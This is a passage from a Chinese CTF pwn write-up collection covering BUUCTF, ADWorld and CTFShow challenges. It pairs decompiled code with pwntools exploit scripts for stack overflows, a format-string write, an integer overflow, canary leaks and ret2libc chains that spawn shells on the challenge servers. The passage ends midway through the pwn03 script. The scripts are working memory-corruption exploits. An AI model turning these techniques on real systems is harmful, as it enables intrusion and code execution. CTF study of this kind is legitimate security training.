[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/sheep a flag/sheep_a_flag'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`sheep_a_flag`，按`F5`反汇编源码并查看主函数。

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  unsigned int v3; // eax
  unsigned int v5; // [rsp+4h] [rbp-92Ch] BYREF
  unsigned int v6; // [rsp+8h] [rbp-928h] BYREF
  unsigned int *v8; // [rsp+10h] [rbp-920h]
  unsigned int *v9; // [rsp+18h] [rbp-918h]
  char v10[2312]; // [rsp+20h] [rbp-910h] BYREF
  unsigned __int64 v11; // [rsp+928h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  v5 = 0;
  v6 = 0;
  v8 = &v5;
  v9 = &v6;
  v3 = time(0LL);
  srand(v3);
  sub_400897(v10, a2);
  sub_400A3B(v10, 12LL, 12LL);
  sub_400E09(v10, v8, v9);
  sub_400CAC(v10, v5, v6);
  if ( !(unsigned int)sub_400F63(v10, v5, v6) )
    return 0LL;
  puts("Congratulate! Thanks for you let the sheep get the flag!");
  puts("Here is your gift! You get a Fmt_Sheep!");
  puts("Try to use it ?!");
  sub_401179();
  if ( dword_602080 == 1919810 )
  {
    puts("\nIt seems that this Fmt_Sheep likes you!");
    system("$0");
  }
  else
  {
    puts("\nSorry... The Fmt_Sheep hates you!");
  }
  return 0LL;
}
```

`sub_400CAC()`函数将程序生成的迷宫打印输出，`sub_400F63()`函数判断输入的路径能否走出迷宫。

```c
__int64 __fastcall sub_400F63(__int64 a1, int a2, int a3)
{
  char v5; // [rsp+1Bh] [rbp-95h]
  int v7; // [rsp+20h] [rbp-90h]
  int i; // [rsp+24h] [rbp-8Ch]
  char buf[120]; // [rsp+30h] [rbp-80h] BYREF
  unsigned __int64 v10; // [rsp+A8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  puts("Plz Input Your Ans: ");
  read(0, buf, 0x64uLL);
  v7 = 0;
  for ( i = 0; buf[i] && buf[i] != 10 && buf[i] != 32; ++i )
  {
    v5 = buf[i];
    switch ( v5 )
    {
      case 'w':
        --a2;
        break;
      case 's':
        ++a2;
        break;
      case 'a':
        --v7;
        break;
      case 'd':
        ++v7;
        break;
    }
    if ( a2 < 0 || a2 > 23 || v7 < 0 || v7 > 23 )
    {
      printf("You get out of maze! [%d, %d]\n", (unsigned int)a2, (unsigned int)v7);
      return 0LL;
    }
    if ( !*(_DWORD *)(a1 + 96LL * a2 + 4LL * v7) )
    {
      printf("You hit the wall... [%d, %d]\n", (unsigned int)a2, (unsigned int)v7);
      return 0LL;
    }
  }
  if ( a2 == a3 && v7 == 23 )
    return 1LL;
  puts("You are not out of this maze...");
  return 0LL;
}
```

求解迷宫路径的代码如下：

```python
from pwn import*

ans = ''
v = []
map = []
def dfs(res,x,y):
    global ans
    if x == flag_x and y == flag_y:
        ans = res
        return
    if x>0 and map[x-1][y]!=0 and v[x-1][y]!=1:
        v[x-1][y] = 1
        dfs(res+'w', x-1, y)
        v[x-1][y] = 0
    if y>0 and map[x][y-1]!=0 and v[x][y-1]!=1:
        v[x][y-1] = 1
        dfs(res+'a', x, y-1)
        v[x][y-1] = 0
    if y<23 and map[x][y+1]!=0 and v[x][y+1]!=1:
        v[x][y+1] = 1
        dfs(res+'d', x, y+1)
        v[x][y+1] = 0
    if x<23 and map[x+1][y]!=0 and v[x+1][y]!=1:
        v[x+1][y] = 1
        dfs(res+'s', x+1, y)
        v[x+1][y] = 0
    return


io = remote('node4.buuoj.cn', 25870)
sheep_x = -1
sheep_y = -1
flag_x = -1
flag_y = -1
io.recvuntil(b"Here is the maze, and use 'wsad' to control your position!\n")
for i in range(24):
    x=[]
    y=[]
    a = io.recvline().decode()
    for j in range(24):
        y.append(0)
        if a[j] == '🈲':
            x.append(0)
        if a[j] == '⬛':
            x.append(0)
        if a[j] == '⬜':
            x.append(1)
        if a[j] == '🐏':
            x.append(2)
            sheep_x = i
            sheep_y = j
        if a[j] == '🚩':
            x.append(3)
            flag_x = i
            flag_y = j
    map.append(x)
    v.append(y)
    print(a, end='')


log.info("🐏in({}, {}), 🚩in({}, {})".format(sheep_x, sheep_y, flag_x, flag_y))
dfs('', sheep_x, sheep_y)
log.info('The path to pass maze is: %s' % ans)
io.sendlineafter(b'Plz Input Your Ans: \n', ans.encode())
```

走出迷宫后就能继续执行程序，其中`sub_401179()`函数将程序跳转到`0x40119C`处执行。

```
void sub_401179()
{
  JUMPOUT(0x40119CLL);
}
```

地址`0x40119C`是`sub_40119C()`函数的起始地址，根据注释可知局部变量`v0`是`rbp`寄存器所在地址，`read()`函数在`(void *)(v0-96)`这个偏移地址读入了`0x50`字节的数据。回到主函数中，`if`语句判断条件`dword_602080 == 1919810`，若为真就执行`system("$0")`，即可得到靶机的`shell`。`1919810`就是`0x1d4b42`，因此我们需要利用格式化字符串漏洞，将`1d`，`4b`，`42`这三个字节数据分别写入地址`0x602080`，`0x602081`，`0x602082`。`hhn`是写入一个字节。

```c
unsigned __int64 __fastcall sub_40119C()
{
  __int64 v0; // rbp

  read(0, (void *)(v0 - 96), 0x50uLL);
  printf((const char *)(v0 - 96));
  return __readfsqword(0x28u) ^ *(_QWORD *)(v0 - 8);
}
```

编写`Python`代码求解得到`flag{4c62e57e-9603-47be-be0c-1dcf75fc1e3d}`。

```python
from pwn import*

ans = ''
v = []
map = []
def dfs(res,x,y):
    global ans
    if x == flag_x and y == flag_y:
        ans = res
        return
    if x>0 and map[x-1][y]!=0 and v[x-1][y]!=1:
        v[x-1][y] = 1
        dfs(res+'w', x-1, y)
        v[x-1][y] = 0
    if y>0 and map[x][y-1]!=0 and v[x][y-1]!=1:
        v[x][y-1] = 1
        dfs(res+'a', x, y-1)
        v[x][y-1] = 0
    if y<23 and map[x][y+1]!=0 and v[x][y+1]!=1:
        v[x][y+1] = 1
        dfs(res+'d', x, y+1)
        v[x][y+1] = 0
    if x<23 and map[x+1][y]!=0 and v[x+1][y]!=1:
        v[x+1][y] = 1
        dfs(res+'s', x+1, y)
        v[x+1][y] = 0
    return


io = remote('node4.buuoj.cn', 25870)
sheep_x = -1
sheep_y = -1
flag_x = -1
flag_y = -1
io.recvuntil(b"Here is the maze, and use 'wsad' to control your position!\n")
for i in range(24):
    x=[]
    y=[]
    a = io.recvline().decode()
    for j in range(24):
        y.append(0)
        if a[j] == '🈲':
            x.append(0)
        if a[j] == '⬛':
            x.append(0)
        if a[j] == '⬜':
            x.append(1)
        if a[j] == '🐏':
            x.append(2)
            sheep_x = i
            sheep_y = j
        if a[j] == '🚩':
            x.append(3)
            flag_x = i
            flag_y = j
    map.append(x)
    v.append(y)
    print(a, end='')


log.info("🐏in({}, {}), 🚩in({}, {})".format(sheep_x, sheep_y, flag_x, flag_y))
dfs('', sheep_x, sheep_y)
log.info('The path to pass maze is: %s' % ans)
io.sendlineafter(b'Plz Input Your Ans: \n', ans.encode())
payload=b'%29c%10$hhn%37c%11$hhn%9c%12$hhn'+p64(0x602082)+p64(0x602080)+p64(0x602081)
io.sendlineafter(b'Try to use it ?!\n', payload)
io.interactive()
```

------

## ADWorld

### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)

先`file ./get_shell`查看文件类型再`checksec --file=get_shell`检查一下文件保护情况。`nc`进去`ls`后发现可以直接`cat flag`，从而得到`cyberpeace{307531652bd497aefcfef07598c97cd3}`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5049/1.png)

提交`flag`后，我还是决定用`IDA Pro 64bit`打开附件`get_shell`来分析一下，发现该程序输出字符串后直接给定了一个系统调用。

![](https://paper.tanyaodan.com/ADWorld/pwn/5049/2.png)

可以按`F5`反汇编源码并查看主函数。

![](https://paper.tanyaodan.com/ADWorld/pwn/5049/3.png)

编写`Python`代码拿到`cyberpeace{307531652bd497aefcfef07598c97cd3}`。

```python
from pwn import *

io = remote('111.200.241.244', 59901)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5049/4.png)

------

### [hello_pwn](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5052&page=1)

先`file ./hello_pwn`查看文件类型再`checksec --file=hello_pwn`检查一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/1.png)

用`IDA Pro 64bit`打开附件`hello_pwn`，按`F5`反汇编源码并查看主函数，发现`read()`函数很可疑，双击`unk_601068`变量查看其在内存中的地址情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/2.png)

发现`unk_601068`变量和`dword_60106C`的偏移量为`0x4`，这个数值小于`read()`函数的范围限制。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/3.png)

当`dword_60106C`的数值等于`1853186401`时会调用子函数`sub_400686()`，查看详情发现该子函数是系统调用`cat flag.txt`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/4.png)

构造`payload`时先用`4`个字节占满`unk_601068`变量，再用`p64()`函数将`dword_60106C`的数值赋值为`1853186401`，编写`Python`代码即可得到`cyberpeace{285b4e962d0debee56c43f8f174f2e22}`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5052/5.png)

------

### [level0](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5053)

先`file ./level0`查看文件类型再`checksec --file=level0`一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/1.png)

用`IDA Pro 64bit`打开附件`level0`，按`F5`反汇编源码并查看主函数，发现`vulnerable()`函数很可疑。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/2.png)

双击`vulnerable()`函数查看详情，发现该函数中有个局部变量`buf`是`char`型数组，`buf`的长度只有`0x80`，即可用栈大小只有`128`字节，但是`read()`函数中`buf`变量从标准控制台读入了`0x200`个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/3.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x80`个字节占满`buf`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/4.png)

在`Function Window`中注意到有一个名为`callsystem()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`callsystem()`函数的起始地址`0x400596`即可。

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/5.png)

编写`Python`代码即可得到`cyberpeace{abcdc2f34ed094260c9ef32f07e7465b}`。

```python
from pwn import *

io = remote('111.200.241.244', 53710)
e = ELF('level0')
address = e.symbols['callsystem']
log.success('callsystem_address => %s' % hex(address).upper())
payload = b'a'*(0x80) + b'fuckpwn!' + p64(address)
# payload = b'a'*(0x80) + b'fuckpwn!' + p64(0x400596)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5053/6.png)

------

### [level2](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5055)

先`file ./level2`查看文件类型再`checksec --file=level2`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/1.png)

用`IDA Pro 32bit`打开附件`level2`，按`F5`反汇编源码并查看主函数，发现`vulnerable_function()`函数很可疑。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/2.png)

双击`vulnerable_function()`函数查看详情，发现该函数中有个局部变量`buf`是`char`型数组，`buf`的长度只有`0x88`，即可用栈大小只有`136`字节，但是`read()`函数中`buf`变量从标准控制台读入了`0x100`个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/3.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x88`个字节占满`buf`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/4.png)

双击`system()`函数查看详情，函数返回值直接是系统调用，因此构造`payload`时需要再加上`system()`函数的起始地址`0x8048320`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/5.png)

`p32()`可以让我们将整数转换为`4`字节的小端序格式，`system()`函数的参数`command`要求`dword ptr 4`，所以进入到`system()`函数后，还需要构造`system()`函数的栈帧，我们可以用`0xDEADBEEF`来填充已分配但还未初始化的内存，也可以用`p32(0)`来填充四个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/6.png)

最后再加上`system()`函数中的参数`/bin/sh`的地址即可获得`shell`。这里用了`ELF`中的`search()`函数来获取`/bin/sh`的地址。

编写`Python`代码即可得到`cyberpeace{5f581b52af1ababeb4636a8c9911e25d}`。

```python
from pwn import *

io = remote('111.200.241.244', 53598)
e = ELF('level2')
system_address = e.symbols['system']
log.success('system_address => %s' % hex(system_address).upper())
bin_sh_address = e.search(b'/bin/sh').__next__()
log.success('bin_sh_address => %s' % hex(bin_sh_address).upper())
payload = b'a'*0x88 + b'fuck' + p32(system_address) + p32(0xDEADBEEF) + p32(bin_sh_address)
# payload = b'a'*0x88 + b'fuck' + p32(0x8048320) + p32(0) + p32(0x804A024)
io.sendlineafter(b'Input:\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5055/7.png)

------





------

### [int_overflow](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5058)

先`file ./int_overflow`查看文件类型再`checksec --file=int_overflow`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/1.png)

用`IDA Pro 32bit`打开附件`int_overflow`，按`F5`反汇编源码并查看主函数，显然首先要发送`1`来进入`login()`函数。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/2.png)

双击`login()`函数查看详情，不存在栈溢出，程序接受了一个最大长度为`0x199`的`password`，并将其作为参数传递给了`check_passwd()`函数。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/3.png)

双击`check_passwd()`函数查看详情，程序用了一个`8bit`的无符号整型变量存储`password`的长度，之后用字符串拷贝函数`strcpy()`将其拷贝到一个长度为`0x14`的`char`型变量`dest`中。`8bit`能表示的十进制范围是`0~255`，而`password`的最大长度为`0x199`（十进制为 409），长度远大于`1`字节，存在整数溢出。`password`字符串的长度可以是`4~8`个字符，也可以是`259~263`个字符，因此我们可以利用整数溢出来绕过`if`判断从而构造栈溢出。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/4.png)

在`Function Window`中注意到有一个名为`what_is_this()`的函数，函数返回值直接是系统调用`system("cat flag")`，因此构造`payload`时需要再加上这个`what_is_this()`函数的起始地址`0x804868B`，当然也可以`ELF`再`symbols['what_is_this']`来获取。

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/5.png)

编写`Python`代码即可得到`cyberpeace{8f9f902ebeb37850f02feee9facc249d}`。

```python
from pwn import *

io = remote('111.200.241.244', 55529)
e = ELF('./int_overflow')
io.sendlineafter(b'Your choice:', b'1')
io.sendlineafter(b'Please input your username:', b't0ur1st')
payload = b'a'*0x14 + b'pwn!' + p32(e.symbols['what_is_this'])
payload = payload.ljust(263, b'a')
io.sendlineafter(b'Please input your passwd:', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5058/6.png)

------

### [cgpwn2](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5059)

先`file ./cgpwn2`查看文件类型再`checksec --file=cgpwn2`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/1.png)

用`IDA Pro 32bit`打开附件`cgpwn2`，按`F5`反汇编源码并查看主函数，发现`hello()`函数很可疑。

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/2.png)

双击`hello()`函数查看详情，可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x26`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/3.png)

注意到`name`是`bss`段中一个大小为`0x34`的区域，变量`s`的起始位置在程序运行时距离栈帧有`0x26`个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/4.png)

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/5.png)

构造`payload`时可以先传入`/bin/sh`给`name`，接着用`0x26`个字节占满`s`变量，然后再用`4`个字节覆盖到`r`，最后指向`system()`函数和`name`的地址，从而完成系统调用。编写`Python`代码即可得到`cyberpeace{0de31e1800e130387c77fabf5ece76c9}`。

```python
from pwn import *

io = remote('111.200.241.244', 56171)
e = ELF('./cgpwn2')
system_address = e.symbols['system']
info('system_address => 0x%x', system_address)
name_address = 0x804A080 
payload = b'a'*0x26 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(name_address)
io.sendlineafter(b'please tell me your name', b'/bin/sh')
io.sendlineafter(b'hello,you can leave some message here:', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5059/6.png)

------

### [level3](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5060)

先`file ./level3`查看文件类型再`checksec --file=level3`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/1.png)

用`IDA Pro 32bit`打开附件`level3`，可以看到主函数如下：

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/2.png)

双击`vulnerable_function`查看详情：

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/3.png)

按`F5`反汇编源码可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/4.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x88`个字节占满`buf`变量，然后再加上`4`个字节覆盖到`r`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/5.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并利用`write()`函数泄露`write()`函数在`got`表中的真实地址。接着我们可以用题目附件给出的`libc_32.so.6`来得到`write()`函数的偏移地址，从而计算出`libc`的基址地址`libcbase`，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，最后发送`payload`即可拿到`flag`。

编写`Python`代码即可得到`cyberpeace{e1aa176d2d3aca8bc677d1c25dc9d919}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('111.200.241.244', 51304)
e = ELF('./level3')
write_plt = e.plt['write'] # 0x8048340
info('write_plt => 0x%x', write_plt)
write_got = e.got['write'] # 0x804a018
info('write_got => 0x%x', write_got)
main_address = e.symbols['main'] # 0x8048484
info('main_address => 0x%x', main_address)
payload = b'a'*0x88 + b'pwn!'
payload += flat(write_plt, main_address, 1, write_got, 4)
io.sendlineafter(b'Input:\n', payload)
write_address = u32(io.recv(4)) 
log.success('write_address => %s', hex(write_address))
libc = ELF('./libc/libc_32.so.6')
libcbase = write_address - libc.symbols['write']
log.success('libcbase_address => 0x%x', libcbase)
system_address = libcbase + libc.symbols['system'] 
log.success('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.search(b'/bin/sh').__next__() 
log.success('bin_sh_address => 0x%x', bin_sh_address)
payload = b'a'*0x88 + b'pwn!'
payload += flat(system_address, 0xdeadbeef, bin_sh_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/5060/6.png)

------

### [Mary_Morton](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4979)

先`file ./Mary_Morton`查看文件类型再`checksec --file=Mary_Morton`检查一下文件保护情况。`Canary found`。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/1.png)

用`IDA Pro 64bit`打开附件`Mary_Morton`，按`F5`反汇编源码并查看主函数。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/2.png)

双击`sub_4009FF()`函数查看详情。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/3.png)

双击`sub_4009DA()`函数查看详情。通过观察主函数后面的代码发现这部分代码并没有骗人，输入`1`确实可以看到栈溢出漏洞，输入`2`确实存在格式化字符串漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/4.png)

双击`sub_4008EB()`函数查看详情，我们可以利用该函数的格式化漏洞来泄露出`canary`的值。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/5.png)

双击`sub_400960()`函数查看详情，我们可以利用该函数的栈溢出漏洞来让程序执行后门函数从而拿到`flag`。

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/6.png)

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/7.png)

编写`Python`代码即可得到`cyberpeace{2b62375defc58c432dee9e3903b48022}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('111.200.241.244', 51303)
io.sendlineafter(b'3. Exit the battle', b'2')
io.sendline(b'%23$p')
io.recvuntil(b'0x')
canary = int(io.recv(16), 16)
flag_addr = 0x4008da
io.sendlineafter(b'3. Exit the battle', b'1')
payload = b'a'*0x88 + p64(canary) + b'a'*8 + p64(flag_addr)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/4979/8.png)

------

### [反应釜开关控制](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4912)

先`file ./pwn4912`查看文件类型再`checksec --file=./pwn4912`检查一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/1.png)

用`IDA Pro 64bit`打开附件`pwn4912`，按`F5`反汇编源码并查看主函数。注意到`char`型数组变量`v5`的可用栈大小为`0x200`，但是`get()`函数读取输入到`v5`时并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/2.png)

双击`v5`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x200`个字节占满`v5`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/3.png)

在`Functions window`中可以看到有一个名为`shell()`的函数，其返回值直接是系统调用`system("/bin/sh")`。

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/4.png)

编写`Python`代码即可得到`cyberpeace{987dd90c37712192c8f03a9f47c6e879}`。

```python
from pwn import *

io = remote('111.200.241.244', 51772)
e = ELF('./pwn4912')
shell_address = e.symbols['shell']
payload = b'a'*0x200 + b'fuckpwn!' + p64(shell_address)
io.sendlineafter(b'>', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/ADWorld/pwn/4912/5.png)

------

### [pwn1](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4598)

先`file ./pwn1`查看文件类型再`checksec --file=./pwn1`检查一下文件保护情况。

![](https://paper.tanyaodan.com/ADWorld/pwn/4598/1.png)

用`IDA Pro 64bit`打开附件`pwn1`，按`F5`反汇编查看主函数源码：

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int v3; // eax
  char s[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v6; // [rsp+98h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  memset(s, 0, 0x80uLL);
  while ( 1 )
  {
    sub_4008B9();
    v3 = sub_400841();
    switch ( v3 )
    {
      case 2:
        puts(s);
        break;
      case 3:
        return 0LL;
      case 1:
        read(0, s, 0x100uLL);   //这里就是栈溢出漏洞点
        break;
      default:
        sub_400826("invalid choice");
        break;
    }
    sub_400826(&unk_400AE7);
  }
}
```

双击`sub_4008B9()`函数查看详情，可以看到有三个可选项：

```c
__int64 sub_4008B9()
{
  sub_400826("--------");
  sub_400826("1.store");
  sub_400826("2.print");
  sub_400826("3.quit");
  sub_400826("--------");
  return sub_4007F7(">> ");
}
```

由于文件开启了`canary`保护，所以我们需要先泄露`canary`。而栈溢出漏洞点就在选择`1`后的`read(0, s, 0x100uLL);`，读取的字符长度超出了`char`型数组的定义长度。此外，我们还需要用`ROPgadget`找到`pop_rdi_ret`的地址：

```bash
ROPgadget --binary ./babystack --only "pop|ret"
```

接着就可以绕开`canary`保护，利用`puts()`函数的`got`表和`plt`表来泄露`puts()`函数在内存中的地址，从而得到`libc`的版本信息和`libc`的基址地址，最后构造`ROP`链来获取`shell`。编写`Python`代码即可得到`cyberpeace{987dd90c37712192c8f03a9f47c6e879}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('111.200.241.244', 56617)
e = ELF('./babystack')
 
def get_info():
	info = io.recvline()
	return info
 
def store_info(payload):
	io.sendlineafter(b'>> ', b'1')
	io.sendline(payload)
	return get_info()
 
 
def print_info():
	io.sendlineafter(b'>> ', b'2')
	return get_info()
 
#leak canary
payload = b'a'*0x88
store_info(payload)
print_info()
canary = u64(io.recv(7).rjust(8, b'\x00'))
log.success("canary => %#x", canary)

# leak libcbase_address 
pop_rdi = 0x400a93
puts_got = e.got['puts']
puts_plt = e.plt['puts']
main_address = 0x400908
payload = b'a'*0x88 + p64(canary) + b't0ur1st!'
payload += flat(pop_rdi, puts_got, puts_plt, main_address)
store_info(payload)
io.sendlineafter(b'>> ', b'3')
puts_address = u64(io.recv(6).ljust(8, b'\x00'))
log.info("puts_address => %#x", puts_address)
libc = LibcSearcher('puts', puts_address)  # libc6_2.23-0ubuntu10_amd64
libcbase = puts_address - libc.dump('puts')

# get shell
system_address = libcbase + libc.dump('system')
log.success("system_address => %#x", system_address)
bin_sh_address = libcbase + libc.dump('str_bin_sh')
log.success("binsh_address => %#x", bin_sh_address)
payload = b'a'*0x88 + p64(canary) + b't0ur1st!'
payload += flat(pop_rdi, bin_sh_address, system_address, main_address)
store_info(payload)
io.sendlineafter(b'>> ', b'3')
io.interactive()
```

------

### [Aul](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=5009)

这道题没有附件，`nc`进去之后就是玩游戏，输入`help`后发现这是个`lua`程序，而下面的乱码像是`lua`的字节码。

```bash
nc 111.200.241.244 53412
help
os.execute("/bin/sh")
ls
cat flag
```

输入`os.execute("/bin/sh")`可以调用`shell`，`ls`后`cat flag`可以得到`cyberpeace{bd2ac997dde16e9d40620def86a5df67}`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5009/1.png)

------

## CTFShow

### pwn02

先`file ./stack`查看文件类型再`checksec --file=stack`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn02/1.png)

用`IDA Pro 32bit`打开附件`stack`，按`F5`反汇编源码并查看主函数，发现`pwnme()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn02/2.png)

双击`pwnme()`函数可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x9`，即可用栈大小只有`9`字节，但是`fgets()`函数限制输入50个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn02/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`9`个字节占满`s`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn02/4.png)

在`Function Window`中注意到有一个名为`stack()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`stack()`函数的起始地址即可。

![](https://paper.tanyaodan.com/CTFShow/pwn02/5.png)

编写`Python`代码即可得到`ctfshow{62a18b45-a931-4c43-9a7a-21726633f01e}`。

![](https://paper.tanyaodan.com/CTFShow/pwn02/6.png)

------

### pwn03

先`file ./pwn03`查看文件类型再`checksec --file=pwn03`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn03/1.png)

用`IDA Pro 32bit`打开附件`pwn03`，按`F5`反汇编源码并查看主函数，发现`pwnme()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn03/2.png)

双击`pwnme()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x9`，即可用栈大小只有`9`字节，但是`fgets()`函数读取输入到变量`s`时限制输入`100`个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn03/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x9`个字节占满`s`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn03/4.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

编写`Python`代码即可得到`ctfshow{c7611c91-203e-47de-ac92-e0f850aa9135}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
# io = process('pwn03')
io = remote('pwn.challenge.ctf.show', 28067)
e = ELF('pwn03')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
# 先让栈溢出，再利用puts函数的plt表地址来泄露puts函数got表中的真实地址
payload = b'a'*0x9 + b'fuck' + p32(puts_plt) + p32(main_address) + p32(puts_got)
io.sendline(payload)
